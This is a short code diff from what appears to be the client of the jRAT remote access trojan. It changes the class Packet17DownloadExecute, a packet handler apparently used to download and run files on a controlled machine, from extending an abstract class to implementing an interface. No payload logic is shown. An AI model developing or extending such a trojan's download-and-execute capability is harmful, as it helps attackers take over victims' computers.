@@ -3,7 +3,7 @@ package jrat.client.packets.incoming;
 import jrat.client.Connection;
 import jrat.client.Downloader;
 
-public class Packet17DownloadExecute extends AbstractIncomingPacket {
+public class Packet17DownloadExecute implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
